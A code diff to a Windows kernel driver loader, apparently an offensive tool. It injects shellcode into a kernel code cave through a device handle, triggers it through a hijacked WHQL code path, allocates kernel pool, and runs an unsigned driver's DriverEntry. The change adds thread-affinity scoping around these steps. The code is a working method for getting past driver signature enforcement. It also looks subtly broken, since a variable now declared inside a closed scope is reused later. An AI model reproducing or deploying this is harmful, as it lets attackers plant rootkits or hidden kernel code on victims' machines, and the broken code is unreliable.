@@ -150,26 +150,29 @@ static bool LoadDrvWskViaPool(
     allocParams.imageSize                = img.SizeOfImage;
 
     // 注入微型内存分配探针
-    if (!InjectShellcodeFull(hDev, cr3, site, caveVA, allocParams, scAllocProbe, scAllocProbe_size)) {
-        LOG_ERR("LoadDrvWskViaPool: Failed to inject scAllocProbe");
-        CloseHandle(hDev);
-        return false;
-    }
+    {
+        ScopedThreadAffinity threadAffinity;
+        if (!InjectShellcodeFull(hDev, cr3, site, caveVA, allocParams, scAllocProbe, scAllocProbe_size)) {
+            LOG_ERR("LoadDrvWskViaPool: Failed to inject scAllocProbe");
+            CloseHandle(hDev);
+            return false;
+        }
 
-    uint32_t gle = 0;
-    if (!WhqlTrigger(hDev, &gle)) {
-        LOG_ERR("LoadDrvWskViaPool: Failed to trigger memory allocation probe (GLE=%u)", gle);
+        uint32_t gle = 0;
+        if (!WhqlTrigger(hDev, &gle)) {
+            LOG_ERR("LoadDrvWskViaPool: Failed to trigger memory allocation probe (GLE=%u)", gle);
+            RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, sizeof(ShellcodeParams) + scAllocProbe_size);
+            CloseHandle(hDev);
+            return false;
+        }
+
+        // 从 Code Cave 读回分配到的内核虚拟地址
+        ShellcodeParams retAllocParams = {};
+        ReadKernelVA(hDev, cr3, caveVA, &retAllocParams, sizeof(retAllocParams));
         RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, sizeof(ShellcodeParams) + scAllocProbe_size);
-        CloseHandle(hDev);
-        return false;
+
+        allocatedPoolVA = retAllocParams.allocatedPoolVA;
     }
-
-    // 从 Code Cave 读回分配到的内核虚拟地址
-    ShellcodeParams retAllocParams = {};
-    ReadKernelVA(hDev, cr3, caveVA, &retAllocParams, sizeof(retAllocParams));
-    RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, sizeof(ShellcodeParams) + scAllocProbe_size);
-
-    uint64_t allocatedPoolVA = retAllocParams.allocatedPoolVA;
     if (allocatedPoolVA == 0) {
         LOG_ERR("LoadDrvWskViaPool: ExAllocatePoolWithTag returned NULL (Insufficient kernel resources)");
         CloseHandle(hDev);
@@ -220,20 +223,23 @@ static bool LoadDrvWskViaPool(
         execParams.bootConfig.Flags         = 0;
     }
 
-    if (!InjectShellcodeFull(hDev, cr3, site, caveVA, execParams, scDirectExec, scDirectExec_size)) {
-        LOG_ERR("LoadDrvWskViaPool: Failed to inject scDirectExec");
-        CloseHandle(hDev);
-        return false;
-    }
+    {
+        ScopedThreadAffinity threadAffinity;
+        if (!InjectShellcodeFull(hDev, cr3, site, caveVA, execParams, scDirectExec, scDirectExec_size)) {
+            LOG_ERR("LoadDrvWskViaPool: Failed to inject scDirectExec");
+            CloseHandle(hDev);
+            return false;
+        }
 
-    gle = 0;
-    bool ioOk = WhqlTrigger(hDev, &gle);
-    RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, sizeof(ShellcodeParams) + scDirectExec_size);
+        gle = 0;
+        bool ioOk = WhqlTrigger(hDev, &gle);
+        RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, sizeof(ShellcodeParams) + scDirectExec_size);
 
-    if (!ioOk) {
-        LOG_ERR("LoadDrvWskViaPool: DriverEntry execution failed or returned error (GLE=%u)", gle);
-        CloseHandle(hDev);
-        return false;
+        if (!ioOk) {
+            LOG_ERR("LoadDrvWskViaPool: DriverEntry execution failed or returned error (GLE=%u)", gle);
+            CloseHandle(hDev);
+            return false;
+        }
     }
     LOG_OK("LoadDrvWskViaPool: Phase 4 complete! DriverEntry executed successfully.");
 
